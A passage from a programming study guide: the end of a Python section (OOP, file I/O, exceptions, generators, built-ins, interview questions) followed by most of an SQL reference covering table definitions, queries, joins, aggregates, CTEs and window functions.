power_of_2(10)   # 1024

# reduce
product = reduce(lambda acc, x: acc * x, [1,2,3,4,5])  # 120

# Memoization
@lru_cache(maxsize=None)
def fib(n):
    if n < 2: return n
    return fib(n-1) + fib(n-2)
```

---

## 12. Object-Oriented Programming

```python
class Animal:
    # Class variable (shared)
    kingdom = "Animalia"
    _count = 0

    def __init__(self, name: str, sound: str):
        """Constructor"""
        self.name = name          # Public instance variable
        self._sound = sound       # Protected (convention)
        self.__id = Animal._count # Private (name-mangled)
        Animal._count += 1

    # Instance method
    def speak(self) -> str:
        return f"{self.name} says {self._sound}!"

    # Property (getter)
    @property
    def sound(self) -> str:
        return self._sound

    # Property setter
    @sound.setter
    def sound(self, value: str):
        if not value:
            raise ValueError("Sound cannot be empty")
        self._sound = value

    # Property deleter
    @sound.deleter
    def sound(self):
        self._sound = ""

    # Class method
    @classmethod
    def get_count(cls) -> int:
        return cls._count

    @classmethod
    def from_dict(cls, data: dict):
        """Alternative constructor"""
        return cls(data["name"], data["sound"])

    # Static method (no self/cls)
    @staticmethod
    def describe() -> str:
        return "Animals are multicellular organisms"

    # Magic/dunder methods
    def __str__(self) -> str:       # str(obj)
        return f"Animal({self.name})"

    def __repr__(self) -> str:      # repr(obj) — developer view
        return f"Animal(name={self.name!r}, sound={self._sound!r})"

    def __len__(self) -> int:
        return len(self.name)

    def __eq__(self, other) -> bool:
        if not isinstance(other, Animal):
            return NotImplemented
        return self.name == other.name

    def __lt__(self, other) -> bool:
        return self.name < other.name

    def __hash__(self):
        return hash(self.name)

    def __bool__(self):
        return bool(self.name)

    def __contains__(self, item):    # "x" in obj
        return item in self.name

    def __iter__(self):              # for x in obj
        return iter(self.name)

    def __getitem__(self, index):    # obj[index]
        return self.name[index]

    def __add__(self, other):        # obj + other
        return Animal(self.name + other.name, self._sound)

    def __call__(self, *args):       # obj()
        return self.speak()


class Dog(Animal):
    """Inherits from Animal."""

    def __init__(self, name: str, breed: str):
        super().__init__(name, "Woof")  # Call parent __init__
        self.breed = breed
        self.tricks = []

    def learn_trick(self, trick: str):
        self.tricks.append(trick)
        return self  # Enable method chaining

    def perform(self) -> list:
        return [f"{self.name}: {t}" for t in self.tricks]

    def speak(self) -> str:         # Override parent method
        base = super().speak()      # Call parent method
        return f"{base} *tail wagging*"


class Cat(Animal):
    def __init__(self, name: str, indoor: bool = True):
        super().__init__(name, "Meow")
        self.indoor = indoor


# Multiple inheritance
class Labrador(Dog):
    pass

class ServiceDog(Dog):
    def __init__(self, name: str, breed: str, task: str):
        super().__init__(name, breed)
        self.task = task


# Abstract base classes
from abc import ABC, abstractmethod

class Shape(ABC):
    @abstractmethod
    def area(self) -> float:
        pass

    @abstractmethod
    def perimeter(self) -> float:
        pass

    def describe(self) -> str:
        return f"Area: {self.area():.2f}, Perimeter: {self.perimeter():.2f}"

class Circle(Shape):
    def __init__(self, radius: float):
        self.radius = radius

    def area(self) -> float:
        return math.pi * self.radius ** 2

    def perimeter(self) -> float:
        return 2 * math.pi * self.radius


# Dataclasses (Python 3.7+)
from dataclasses import dataclass, field
from typing import List

@dataclass
class User:
    name: str
    age: int
    email: str = ""
    roles: List[str] = field(default_factory=list)

    def __post_init__(self):
        self.email = self.email or f"{self.name.lower()}@example.com"

# Auto-generates __init__, __repr__, __eq__
user = User("Alice", 25)
user2 = User("Alice", 25)
user == user2    # True (value comparison)
```

---

## 13. File I/O

```python
# Writing a file
with open("file.txt", "w", encoding="utf-8") as f:
    f.write("Hello, World!\n")
    f.write("Second line\n")

# Append
with open("file.txt", "a") as f:
    f.write("Appended line\n")

# Reading a file
with open("file.txt", "r", encoding="utf-8") as f:
    content = f.read()        # Entire file as string
    lines = f.readlines()     # List of lines (with \n)
    line = f.readline()       # One line at a time

# Iterate efficiently (line by line, no loading all into memory)
with open("large_file.txt") as f:
    for line in f:
        process(line.rstrip())

# File modes
# "r"   Read (default)
# "w"   Write (overwrite)
# "a"   Append
# "x"   Exclusive create (fails if exists)
# "b"   Binary mode
# "t"   Text mode (default)
# "+"   Read+Write (r+ or w+)

# Binary files
with open("image.jpg", "rb") as f:
    data = f.read()

with open("copy.jpg", "wb") as f:
    f.write(data)

# JSON
import json
data = {"name": "Alice", "scores": [95, 87, 92]}

# Write JSON
with open("data.json", "w") as f:
    json.dump(data, f, indent=2, ensure_ascii=False)

# Read JSON
with open("data.json") as f:
    loaded = json.load(f)

# JSON to/from string
json_str = json.dumps(data)
parsed = json.loads(json_str)

# CSV
import csv

# Write CSV
with open("data.csv", "w", newline="") as f:
    writer = csv.DictWriter(f, fieldnames=["name", "age"])
    writer.writeheader()
    writer.writerows([{"name":"Alice","age":25}, {"name":"Bob","age":30}])

# Read CSV
with open("data.csv") as f:
    reader = csv.DictReader(f)
    for row in reader:
        print(row["name"], row["age"])

# pathlib (modern file system handling)
from pathlib import Path

p = Path(".")                    # Current directory
p = Path("/home/user/docs")
p = Path.home()                  # Home directory
p = Path.cwd()                   # Current working directory

p / "subdir" / "file.txt"        # Join paths
p.name         # "file.txt"
p.stem         # "file"
p.suffix       # ".txt"
p.suffixes     # ['.tar', '.gz']
p.parent       # Parent directory

p.exists()
p.is_file()
p.is_dir()
p.mkdir(parents=True, exist_ok=True)
p.rmdir()
p.unlink()     # Delete file
p.rename(new_path)
p.stat().st_size   # File size in bytes

# Glob patterns
list(p.glob("*.py"))         # All .py files in dir
list(p.rglob("*.py"))        # Recursive

# Read/write text
p.read_text(encoding="utf-8")
p.write_text("content", encoding="utf-8")
p.read_bytes()
p.write_bytes(b"data")

# List directory contents
for item in p.iterdir():
    print(item)
```

---

## 14. Exception Handling

```python
# try / except / else / finally
try:
    result = 10 / 0
    data = json.loads("invalid")
except ZeroDivisionError as e:
    print(f"Division error: {e}")
except (ValueError, TypeError) as e:
    print(f"Value/Type error: {e}")
except Exception as e:
    print(f"Unexpected error: {type(e).__name__}: {e}")
    raise    # Re-raise the exception
else:
    # Runs ONLY if no exception occurred
    print(f"Result: {result}")
finally:
    # ALWAYS runs (cleanup)
    print("Done")

# Common exceptions
# BaseException
#   SystemExit          sys.exit() called
#   KeyboardInterrupt   Ctrl+C
#   Exception
#     ArithmeticError
#       ZeroDivisionError
#       OverflowError
#     LookupError
#       IndexError      List out of range
#       KeyError        Dict key not found
#     NameError         Variable not defined
#     TypeError         Wrong type
#     ValueError        Right type, wrong value
#     FileNotFoundError No such file
#     PermissionError   No permission
#     RuntimeError
#     StopIteration     Iterator exhausted
#     MemoryError

# Custom exceptions
class AppError(Exception):
    """Base application error."""
    pass

class ValidationError(AppError):
    def __init__(self, message: str, field: str = ""):
        super().__init__(message)
        self.field = field

class NotFoundError(AppError):
    def __init__(self, resource: str, id):
        super().__init__(f"{resource} with id {id} not found")
        self.resource = resource
        self.id = id

# Context managers (with statement)
class DatabaseConnection:
    def __enter__(self):
        self.conn = connect_to_db()
        return self.conn

    def __exit__(self, exc_type, exc_val, exc_tb):
        self.conn.close()
        return False  # Don't suppress exceptions

with DatabaseConnection() as conn:
    conn.execute(query)

# contextlib
from contextlib import contextmanager

@contextmanager
def timer():
    import time
    start = time.time()
    try:
        yield
    finally:
        print(f"Elapsed: {time.time() - start:.4f}s")

with timer():
    slow_operation()
```

---

## 15. Iterators, Generators, and Comprehensions

```python
# Iterators
class CountUp:
    def __init__(self, start, end):
        self.current = start
        self.end = end

    def __iter__(self):
        return self

    def __next__(self):
        if self.current > self.end:
            raise StopIteration
        value = self.current
        self.current += 1
        return value

for n in CountUp(1, 5):
    print(n)   # 1 2 3 4 5

# Generators (lazy iterators)
def count_up(start, end):
    for i in range(start, end + 1):
        yield i          # Suspends here, resumes next time

gen = count_up(1, 5)
next(gen)   # 1
next(gen)   # 2

def fibonacci():
    a, b = 0, 1
    while True:
        yield a
        a, b = b, a + b

fib = fibonacci()
[next(fib) for _ in range(10)]   # [0,1,1,2,3,5,8,13,21,34]

# yield from
def chain(*iterables):
    for iterable in iterables:
        yield from iterable

def infinite_counter(start=0):
    while True:
        yield start
        start += 1

# Generator expressions
squares_gen = (x**2 for x in range(10))  # Use () not []
sum(x**2 for x in range(10))    # More efficient than list comprehension
big_files = (f for f in Path(".").rglob("*") if f.stat().st_size > 1e6)

# Comprehensions summary
lst = [expr for item in iterable if condition]        # List
dct = {k: v for k, v in iterable if condition}        # Dict
st  = {expr for item in iterable if condition}        # Set
gen = (expr for item in iterable if condition)        # Generator

# Built-in itertools
import itertools

itertools.count(10, 2)          # 10, 12, 14, 16, ... (infinite)
itertools.cycle([1,2,3])        # 1, 2, 3, 1, 2, 3, ... (infinite)
itertools.repeat(x, n)         # x, x, x, ... (n times)

itertools.chain([1,2], [3,4])   # 1, 2, 3, 4
itertools.chain.from_iterable([[1,2],[3,4]])
itertools.islice(gen, 5)        # First 5 from generator
itertools.takewhile(lambda x: x<5, count)
itertools.dropwhile(lambda x: x<5, count)
itertools.filterfalse(pred, iterable)

itertools.combinations([1,2,3,4], 2)     # (1,2),(1,3),(1,4),(2,3),...
itertools.permutations([1,2,3], 2)       # All ordered pairs
itertools.product([1,2], [3,4])          # (1,3),(1,4),(2,3),(2,4)
itertools.combinations_with_replacement

itertools.groupby(sorted_data, key=fn)
itertools.zip_longest([1,2,3], [4,5], fillvalue=0)
itertools.starmap(fn, [(1,2),(3,4)])
itertools.accumulate([1,2,3,4], lambda x,y: x*y)  # Running product
```

---

## 16. Common Built-in Functions

```python
# Type constructors
int(), float(), str(), bool(), list(), tuple(), dict(), set(), frozenset()
bytes(), bytearray(), complex()

# Math
abs(-5)       # 5
divmod(10,3)  # (3,1)
pow(2,10)     # 1024
round(3.14,1) # 3.1
max(1,5,3)    # 5; max([1,5,3]) same
min(1,5,3)    # 1
sum([1,2,3])  # 6

# Sequences
len([1,2,3])
range(10), range(2,10), range(0,10,2)
reversed([1,2,3])
sorted([3,1,2])
sorted(words, key=str.lower)
enumerate(lst, start=0)
zip(lst1, lst2, lst3)
zip(*matrix)    # Transpose
filter(pred, iterable)
map(func, iterable)
map(func, lst1, lst2)   # Two inputs

# Functional
all([True, True, False])  # False
any([False, False, True]) # True

# I/O
print("Hello", "World", sep="-", end="!")
input("Enter: ")
open(file, mode)

# Object
id(obj)           # Memory address
hash(obj)
dir(obj)          # List attributes/methods
vars(obj)         # __dict__
help(obj)         # Documentation
repr(obj)
isinstance(obj, cls)
issubclass(Dog, Animal)
callable(obj)     # Is it callable?
getattr(obj, "name")
setattr(obj, "name", "Bob")
delattr(obj, "name")
hasattr(obj, "name")

# Conversion
ord("A")          # 65
chr(65)           # "A"
bin(255)          # "0b11111111"
oct(255)          # "0o377"
hex(255)          # "0xff"

# Other
iter(iterable)
next(iterator)
next(iterator, default)
eval("2 + 2")     # 4 (dangerous with user input!)
exec("x = 5")
compile(src, "<string>", "exec")
__import__("json")
globals()
locals()
format(value, spec)
f"{42:08b}"       # "00101010"
```

---

## 17. Python Interview Questions

**Q: What is the GIL?**
A: The Global Interpreter Lock is a mutex that allows only one thread to execute Python bytecode at a time. This limits CPU-bound multi-threading but doesn't affect I/O-bound threads or multiprocessing.

**Q: What is the difference between a list and a tuple?**
A: Lists are mutable (can be changed); tuples are immutable. Tuples are faster, use less memory, and can be used as dictionary keys (they're hashable).

**Q: What are generators and why use them?**
A: Functions using `yield` to produce values lazily on demand. They're memory-efficient because they don't store the entire sequence in memory — they compute values one at a time.

**Q: Explain `*args` and `**kwargs`.**
A: `*args` collects extra positional arguments into a tuple. `**kwargs` collects extra keyword arguments into a dictionary. Used to create flexible functions accepting variable inputs.

**Q: What is a decorator?**
A: A function that takes another function and extends/modifies its behavior. Implemented as a higher-order function and applied with the `@` syntax.

**Q: What is the difference between `is` and `==`?**
A: `==` compares values (equality). `is` compares identity (same object in memory). `None` should always be compared with `is None`, not `== None`.

**Q: What are list comprehensions and when should you use them?**
A: Concise syntax for creating lists: `[expr for item in iterable if cond]`. Use for simple transformations and filters. For complex logic, use a regular loop for readability.

---

*End of Python Study Guide*


---

# SQL — Complete Study Guide

---

## 1. What Is SQL?

SQL (Structured Query Language) is the standard language for managing and manipulating **relational databases**. It is declarative — you describe **what** you want, not **how** to get it.

Major dialects: MySQL, PostgreSQL, SQLite, Microsoft SQL Server (T-SQL), Oracle (PL/SQL). Core SQL is standardized (ANSI SQL); each RDBMS adds extensions.

Key concepts: tables (rows and columns), schemas, relationships, constraints, indexes, transactions, views, stored procedures.

---

## 2. Database Concepts

### Relational Database Terms

| Term | Definition |
|------|-----------|
| Database | Collection of related tables |
| Table (Relation) | 2D structure of rows (records) and columns (fields) |
| Row (Record/Tuple) | Single data entry |
| Column (Field/Attribute) | Category of data with a specific type |
| Primary Key | Uniquely identifies each row; no NULLs |
| Foreign Key | References a primary key in another table |
| Schema | Blueprint/structure of a database |
| Index | Data structure speeding up queries |
| View | Virtual table based on a query |
| NULL | Absence of a value (not 0, not "") |
| Transaction | Group of operations treated as one unit |

### ACID Properties

| Property | Meaning |
|----------|---------|
| **A**tomicity | All operations succeed, or none do |
| **C**onsistency | Database stays in valid state |
| **I**solation | Concurrent transactions don't interfere |
| **D**urability | Committed transactions survive crashes |

---

## 3. Data Types

### Common SQL Data Types

```sql
-- Numeric
INT / INTEGER          -- Whole numbers (-2B to 2B)
BIGINT                 -- Large whole numbers
SMALLINT               -- Small whole numbers
DECIMAL(p, s)          -- Exact: p=total digits, s=decimal places
NUMERIC(p, s)          -- Same as DECIMAL
FLOAT                  -- Approximate floating point
REAL                   -- Single precision float
BOOLEAN / BOOL         -- TRUE/FALSE (some DBs use TINYINT)

-- String
CHAR(n)                -- Fixed-length (padded with spaces)
VARCHAR(n)             -- Variable-length up to n
TEXT                   -- Unlimited length text
NVARCHAR(n)            -- Unicode variable-length

-- Date/Time
DATE                   -- YYYY-MM-DD
TIME                   -- HH:MM:SS
DATETIME               -- YYYY-MM-DD HH:MM:SS
TIMESTAMP              -- Like DATETIME, often auto-updates
YEAR                   -- YYYY

-- Binary
BLOB                   -- Binary Large Object
BINARY(n)              -- Fixed binary
VARBINARY(n)           -- Variable binary

-- Other
JSON                   -- JSON document (MySQL 5.7+, PostgreSQL)
UUID                   -- Universally Unique Identifier
ENUM('a','b','c')      -- Fixed set of values
ARRAY                  -- PostgreSQL arrays
```

---

## 4. DDL — Data Definition Language

DDL commands define and modify the database **structure**.

### CREATE TABLE

```sql
CREATE TABLE users (
    -- Auto-increment primary key (MySQL)
    id         INT AUTO_INCREMENT PRIMARY KEY,
    -- PostgreSQL: SERIAL or GENERATED ALWAYS AS IDENTITY
    
    -- String columns
    username   VARCHAR(50)  NOT NULL UNIQUE,
    email      VARCHAR(255) NOT NULL,
    full_name  VARCHAR(100),
    bio        TEXT,
    
    -- Numeric
    age        SMALLINT     CHECK (age >= 0 AND age <= 150),
    balance    DECIMAL(10, 2) DEFAULT 0.00,
    
    -- Boolean (MySQL uses TINYINT(1))
    is_active  BOOLEAN       DEFAULT TRUE,
    is_verified BOOLEAN      DEFAULT FALSE,
    
    -- Date/time
    birthdate  DATE,
    created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP,
    updated_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
    
    -- Constraints
    CONSTRAINT chk_email CHECK (email LIKE '%@%.%'),
    CONSTRAINT unique_email UNIQUE (email)
);

CREATE TABLE posts (
    id         INT AUTO_INCREMENT PRIMARY KEY,
    user_id    INT          NOT NULL,
    title      VARCHAR(200) NOT NULL,
    content    TEXT,
    views      INT          DEFAULT 0,
    published  BOOLEAN      DEFAULT FALSE,
    created_at TIMESTAMP    DEFAULT CURRENT_TIMESTAMP,
    
    -- Foreign key constraint
    CONSTRAINT fk_posts_user FOREIGN KEY (user_id)
        REFERENCES users(id)
        ON DELETE CASCADE       -- Delete posts when user deleted
        ON UPDATE CASCADE       -- Update FK when PK changes
);

CREATE TABLE tags (
    id   INT AUTO_INCREMENT PRIMARY KEY,
    name VARCHAR(50) NOT NULL UNIQUE
);

-- Junction table (many-to-many)
CREATE TABLE post_tags (
    post_id INT NOT NULL,
    tag_id  INT NOT NULL,
    PRIMARY KEY (post_id, tag_id),  -- Composite primary key
    FOREIGN KEY (post_id) REFERENCES posts(id) ON DELETE CASCADE,
    FOREIGN KEY (tag_id)  REFERENCES tags(id)  ON DELETE CASCADE
);
```

### ALTER TABLE

```sql
-- Add column
ALTER TABLE users ADD COLUMN phone VARCHAR(20);
ALTER TABLE users ADD COLUMN role VARCHAR(20) DEFAULT 'user' AFTER email;

-- Modify column
ALTER TABLE users MODIFY COLUMN full_name VARCHAR(200) NOT NULL;
ALTER TABLE users CHANGE COLUMN full_name display_name VARCHAR(200);

-- Drop column
ALTER TABLE users DROP COLUMN phone;

-- Add constraint
ALTER TABLE users ADD CONSTRAINT chk_age CHECK (age >= 0);
ALTER TABLE users ADD INDEX idx_email (email);
ALTER TABLE users ADD UNIQUE (username);

-- Drop constraint
ALTER TABLE users DROP CONSTRAINT chk_age;
ALTER TABLE users DROP INDEX idx_email;

-- Rename table
ALTER TABLE users RENAME TO app_users;
RENAME TABLE old_name TO new_name;  -- MySQL
```

### DROP and TRUNCATE

```sql
-- Drop table (structure + data)
DROP TABLE IF EXISTS posts;

-- Drop database
DROP DATABASE IF EXISTS my_database;

-- Truncate (remove all data, keep structure)
TRUNCATE TABLE logs;    -- Much faster than DELETE; resets auto-increment

-- CREATE DATABASE
CREATE DATABASE my_app
    CHARACTER SET utf8mb4
    COLLATE utf8mb4_unicode_ci;

USE my_app;
```

### Indexes

```sql
-- Single column index
CREATE INDEX idx_username ON users (username);

-- Composite index (order matters — leftmost prefix rule)
CREATE INDEX idx_user_date ON posts (user_id, created_at);

-- Unique index
CREATE UNIQUE INDEX idx_email ON users (email);

-- Full-text index (MySQL)
CREATE FULLTEXT INDEX idx_content ON posts (title, content);

-- Partial index (PostgreSQL)
CREATE INDEX idx_active_users ON users (email) WHERE is_active = TRUE;

-- Drop index
DROP INDEX idx_username ON users;   -- MySQL
DROP INDEX idx_username;            -- PostgreSQL
```

---

## 5. DML — Data Manipulation Language

### INSERT

```sql
-- Single row
INSERT INTO users (username, email, age)
VALUES ('alice', 'alice@example.com', 25);

-- Multiple rows (much more efficient than multiple INSERTs)
INSERT INTO users (username, email, age) VALUES
    ('bob', 'bob@example.com', 30),
    ('carol', 'carol@example.com', 28),
    ('dave', 'dave@example.com', 35);

-- Insert from SELECT
INSERT INTO archive_users (username, email, created_at)
SELECT username, email, created_at
FROM users
WHERE created_at < '2020-01-01';

-- Insert or ignore on duplicate
INSERT IGNORE INTO users (username, email) VALUES ('alice', 'alice@example.com');

-- Upsert (insert or update)
INSERT INTO users (id, username, email)
VALUES (1, 'alice', 'newalice@example.com')
ON DUPLICATE KEY UPDATE email = VALUES(email);  -- MySQL

-- PostgreSQL upsert
INSERT INTO users (id, username, email)
VALUES (1, 'alice', 'newalice@example.com')
ON CONFLICT (id) DO UPDATE SET email = EXCLUDED.email;

ON CONFLICT (id) DO NOTHING;
```

### SELECT

```sql
-- Basic
SELECT * FROM users;                           -- All columns (avoid in production)
SELECT id, username, email FROM users;         -- Specific columns
SELECT DISTINCT country FROM users;            -- Unique values only
SELECT username AS name, email AS contact FROM users;  -- Aliases

-- Expressions
SELECT 
    username,
    age,
    age * 12 AS age_months,
    UPPER(email) AS email_upper,
    CONCAT(first_name, ' ', last_name) AS full_name,
    ROUND(score, 2) AS rounded_score,
    COALESCE(phone, email, 'No contact') AS contact  -- First non-NULL
FROM users;

-- Conditional columns
SELECT username,
    CASE 
        WHEN age < 18 THEN 'Minor'
        WHEN age < 65 THEN 'Adult'
        ELSE 'Senior'
    END AS age_group,
    IF(is_active, 'Active', 'Inactive') AS status   -- MySQL only
FROM users;

-- WHERE clause
SELECT * FROM users WHERE age > 25;
SELECT * FROM users WHERE age BETWEEN 18 AND 65;     -- Inclusive
SELECT * FROM users WHERE age NOT BETWEEN 18 AND 65;
SELECT * FROM users WHERE email IN ('a@b.com', 'c@d.com');
SELECT * FROM users WHERE email NOT IN ('a@b.com');
SELECT * FROM users WHERE email IS NULL;
SELECT * FROM users WHERE email IS NOT NULL;
SELECT * FROM users WHERE username LIKE 'a%';    -- Starts with 'a'
SELECT * FROM users WHERE username LIKE '%son';  -- Ends with 'son'
SELECT * FROM users WHERE username LIKE '%ali%'; -- Contains 'ali'
SELECT * FROM users WHERE username LIKE '_ob';   -- Any single char, then 'ob'
SELECT * FROM users WHERE username REGEXP '^[A-Z]';  -- Regex (MySQL)

-- Logical operators
WHERE age > 25 AND is_active = TRUE
WHERE age < 18 OR age > 65
WHERE NOT is_active
WHERE (age > 25 OR role = 'admin') AND is_active = TRUE

-- ORDER BY
SELECT * FROM users ORDER BY age;                    -- Ascending (default)
SELECT * FROM users ORDER BY age DESC;               -- Descending
SELECT * FROM users ORDER BY age DESC, username ASC; -- Multiple columns
SELECT * FROM users ORDER BY RAND();                 -- Random order (MySQL)

-- LIMIT and OFFSET
SELECT * FROM users LIMIT 10;              -- First 10 rows
SELECT * FROM users LIMIT 10 OFFSET 20;   -- Rows 21-30 (pagination)
SELECT * FROM users LIMIT 20, 10;         -- MySQL shorthand: offset, count
```

---

## 6. JOINs

```sql
-- Sample tables
-- users: id, username
-- orders: id, user_id, amount, date

-- INNER JOIN: only matching rows in both tables
SELECT u.username, o.amount, o.date
FROM users u
INNER JOIN orders o ON u.id = o.user_id;

-- LEFT JOIN: all from left, matching from right (NULL if no match)
SELECT u.username, COUNT(o.id) AS order_count
FROM users u
LEFT JOIN orders o ON u.id = o.user_id
GROUP BY u.id, u.username;

-- RIGHT JOIN: all from right, matching from left
SELECT u.username, o.amount
FROM users u
RIGHT JOIN orders o ON u.id = o.user_id;

-- FULL OUTER JOIN: all from both tables
-- MySQL doesn't support FULL OUTER JOIN directly — use UNION
SELECT u.username, o.amount
FROM users u LEFT JOIN orders o ON u.id = o.user_id
UNION
SELECT u.username, o.amount
FROM users u RIGHT JOIN orders o ON u.id = o.user_id;

-- PostgreSQL:
SELECT u.username, o.amount
FROM users u
FULL OUTER JOIN orders o ON u.id = o.user_id;

-- CROSS JOIN: every combination (Cartesian product)
SELECT u.username, s.size
FROM users u
CROSS JOIN sizes s;

-- SELF JOIN: join table to itself
SELECT 
    e.name AS employee,
    m.name AS manager
FROM employees e
LEFT JOIN employees m ON e.manager_id = m.id;

-- Multiple JOINs
SELECT 
    u.username,
    p.title,
    t.name AS tag
FROM users u
JOIN posts p ON u.id = p.user_id
JOIN post_tags pt ON p.id = pt.post_id
JOIN tags t ON pt.tag_id = t.id
WHERE u.is_active = TRUE
ORDER BY p.created_at DESC;
```

---

## 7. Aggregate Functions and GROUP BY

```sql
-- Aggregate functions ignore NULL
SELECT 
    COUNT(*)        AS total_rows,      -- Counts all rows
    COUNT(email)    AS has_email,       -- Counts non-NULL
    COUNT(DISTINCT country) AS countries,
    SUM(balance)    AS total_balance,
    AVG(age)        AS avg_age,
    MAX(age)        AS max_age,
    MIN(age)        AS min_age,
    STD(age)        AS std_dev          -- MySQL
FROM users;

-- GROUP BY
SELECT 
    country,
    COUNT(*) AS user_count,
    AVG(age) AS avg_age,
    SUM(balance) AS total_balance
FROM users
GROUP BY country;

-- GROUP BY multiple columns
SELECT year, month, SUM(revenue)
FROM sales
GROUP BY year, month
ORDER BY year, month;

-- HAVING (filter groups — like WHERE but for aggregates)
SELECT country, COUNT(*) AS count
FROM users
GROUP BY country
HAVING count > 10          -- Only countries with more than 10 users
HAVING COUNT(*) > 10;      -- Same (must use aggregate, not alias in standard SQL)

-- WHERE vs HAVING
SELECT department, AVG(salary)
FROM employees
WHERE is_active = TRUE          -- Filter rows BEFORE grouping
GROUP BY department
HAVING AVG(salary) > 50000;    -- Filter groups AFTER aggregating

-- GROUP BY with ROLLUP (subtotals)
SELECT country, city, SUM(sales)
FROM data
GROUP BY country, city WITH ROLLUP;

-- GROUPING SETS, CUBE (PostgreSQL / SQL Server)
GROUP BY GROUPING SETS ((country, city), (country), ());
```

---

## 8. Subqueries

```sql
-- Scalar subquery (returns single value)
SELECT username
FROM users
WHERE age = (SELECT MAX(age) FROM users);

-- Row subquery
SELECT *
FROM users
WHERE (age, country) = (SELECT age, country FROM vip_users WHERE id = 1);

-- Column subquery with IN
SELECT username
FROM users
WHERE id IN (
    SELECT DISTINCT user_id
    FROM orders
    WHERE amount > 1000
);

-- NOT IN (beware NULLs!)
SELECT username
FROM users
WHERE id NOT IN (
    SELECT user_id FROM banned_users WHERE user_id IS NOT NULL
);

-- Correlated subquery (references outer query — runs once per row)
SELECT username, age
FROM users u
WHERE age > (
    SELECT AVG(age)
    FROM users
    WHERE country = u.country   -- References outer query's row
);

-- EXISTS / NOT EXISTS (more efficient than IN for large datasets)
SELECT username
FROM users u
WHERE EXISTS (
    SELECT 1
    FROM orders o
    WHERE o.user_id = u.id AND o.amount > 1000
);

-- Subquery in FROM (derived table)
SELECT dept, avg_salary
FROM (
    SELECT department AS dept, AVG(salary) AS avg_salary
    FROM employees
    GROUP BY department
) AS dept_averages
WHERE avg_salary > 60000;
```

---

## 9. Common Table Expressions (CTEs)

```sql
-- Basic CTE
WITH active_users AS (
    SELECT id, username, email
    FROM users
    WHERE is_active = TRUE
)
SELECT * FROM active_users WHERE age > 25;

-- Multiple CTEs
WITH 
    revenue AS (
        SELECT user_id, SUM(amount) AS total
        FROM orders
        GROUP BY user_id
    ),
    top_users AS (
        SELECT user_id
        FROM revenue
        WHERE total > 10000
    )
SELECT u.username, r.total
FROM users u
JOIN revenue r ON u.id = r.user_id
WHERE u.id IN (SELECT user_id FROM top_users);

-- Recursive CTE (hierarchy, tree, graph traversal)
WITH RECURSIVE org_chart AS (
    -- Base case: top-level employees (no manager)
    SELECT id, name, manager_id, 0 AS level
    FROM employees
    WHERE manager_id IS NULL
    
    UNION ALL
    
    -- Recursive case: find direct reports
    SELECT e.id, e.name, e.manager_id, oc.level + 1
    FROM employees e
    JOIN org_chart oc ON e.manager_id = oc.id
)
SELECT * FROM org_chart ORDER BY level, name;

-- Fibonacci with recursive CTE
WITH RECURSIVE fib(a, b, n) AS (
    SELECT 0, 1, 1
    UNION ALL
    SELECT b, a+b, n+1 FROM fib WHERE n < 20
)
SELECT a AS fib FROM fib;
```

---

## 10. Window Functions

Window functions calculate over a "window" of related rows without collapsing them.

```sql
-- Syntax: function() OVER (PARTITION BY ... ORDER BY ...)

-- ROW_NUMBER: unique sequential number
SELECT username, age,
    ROW_NUMBER() OVER (ORDER BY age DESC) AS age_rank
FROM users;

-- RANK: tied rows get same rank, gaps after ties
-- DENSE_RANK: tied rows get same rank, no gaps
SELECT username, age, score,
    RANK()       OVER (ORDER BY score DESC) AS rank_with_gaps,
    DENSE_RANK() OVER (ORDER BY score DESC) AS rank_no_gaps,
    ROW_NUMBER() OVER (ORDER BY score DESC) AS unique_rank
FROM scores;

-- PARTITION BY (like GROUP BY within window)
SELECT 
    username,
    department,
    salary,
    RANK() OVER (PARTITION BY department ORDER BY salary DESC) AS dept_rank
FROM employees;

-- NTH_VALUE, FIRST_VALUE, LAST_VALUE
SELECT username, salary,
    FIRST_VALUE(salary) OVER (PARTITION BY dept ORDER BY salary DESC) AS max_in_dept,
    LAST_VALUE(salary) OVER (
        PARTITION BY dept ORDER BY salary DESC
        ROWS BETWEEN UNBOUNDED PRECEDING AND UNBOUNDED FOLLOWING
    ) AS min_in_dept
FROM employees;

-- LAG and LEAD (look at previous/next row)
SELECT month, revenue,
    LAG(revenue, 1) OVER (ORDER BY month) AS prev_month,
    revenue - LAG(revenue, 1, 0) OVER (ORDER BY month) AS growth
FROM monthly_sales;

-- NTILE: divide into n buckets
SELECT username, score,
    NTILE(4) OVER (ORDER BY score) AS quartile
FROM scores;

-- Running totals, moving averages
SELECT 
    date, amount,
    SUM(amount) OVER (ORDER BY date ROWS UNBOUNDED PRECEDING) AS running_total,
    AVG(amount) OVER (ORDER BY date ROWS 6 PRECEDING) AS weekly_avg,
    SUM(amount) OVER (PARTITION BY YEAR(date), MONTH(date)) AS monthly_total
FROM transactions;

-- Frame specifications
ROWS BETWEEN UNBOUNDED PRECEDING AND CURRENT ROW   -- Cumulative
ROWS BETWEEN 1 PRECEDING AND 1 FOLLOWING           -- Surrounding rows
ROWS BETWEEN 6 PRECEDING AND CURRENT ROW           -- Last 7 rows
RANGE BETWEEN INTERVAL 7 DAY PRECEDING AND CURRENT ROW  -- Date-based
```

---

## 11. String Functions

```sql
-- MySQL string functions
CONCAT('Hello', ', ', 'World')      -- 'Hello, World'
CONCAT_WS(', ', 'a', 'b', 'c')     -- 'a, b, c' (with separator)
LENGTH('hello')                      -- 5 (bytes)
CHAR_LENGTH('hello')                 -- 5 (characters)
UPPER('hello')                       -- 'HELLO'
LOWER('HELLO')                       -- 'hello'
TRIM('  hello  ')                    -- 'hello'
LTRIM('  hello')                     -- 'hello'
RTRIM('hello  ')                     -- 'hello'
SUBSTRING('Hello', 2, 3)            -- 'ell' (1-indexed, start, length)
LEFT('Hello', 3)                     -- 'Hel'
RIGHT('Hello', 3)                    -- 'llo'
LOCATE('ll', 'Hello')               -- 3 (1-indexed position)
REPLACE('Hello World', 'World', 'SQL')  -- 'Hello SQL'
REVERSE('hello')                     -- 'olleh'
LPAD('42', 5, '0')                  -- '00042'
RPAD('hi', 5, '!')                  -- 'hi!!!'
REPEAT('ab', 3)                     -- 'ababab'
STRCMP('a', 'b')                    -- -1, 0, or 1
FORMAT(1234567.89, 2)               -- '1,234,567.89'
MD5('password')                     -- MD5 hash
SHA2('password', 256)               -- SHA256 hash

-- Regex (MySQL 8.0+)
WHERE email REGEXP '^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$'
